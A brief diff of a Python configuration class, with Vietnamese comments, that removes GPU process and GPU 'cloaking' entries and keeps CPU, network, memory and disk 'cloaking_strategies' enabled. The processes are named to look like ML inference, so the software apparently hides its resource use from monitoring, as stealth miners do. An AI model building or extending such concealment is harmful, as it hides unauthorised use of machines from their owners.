@@ -1,13 +1,13 @@
 class ConfigModel:
     def __init__(self, **kwargs):
-        self.processes = {'CPU': 'ml-inference', 'GPU': 'inference-cuda'}
+        self.processes = {'CPU': 'ml-inference'}
         self.network_interface = 'eth0'
-        self.process_priority_map = {'ml-inference': 2, 'inference-cuda': 3}
+        self.process_priority_map = {'ml-inference': 2}
         # Đổi tên key sang `cloaking_strategies` để khớp ResourceManager
         # Cấu trúc mặc định tuân theo dạng {strategy_name: {enabled: bool}}
         self.cloaking_strategies = {
             'cpu_cloaking': {'enabled': True},
-            'gpu_cloaking': {'enabled': True},
+            # (CPU-only) GPU cloaking vô hiệu hoá
             'network': {'enabled': True},
             'memory': {'enabled': True},
             'disk': {'enabled': True},
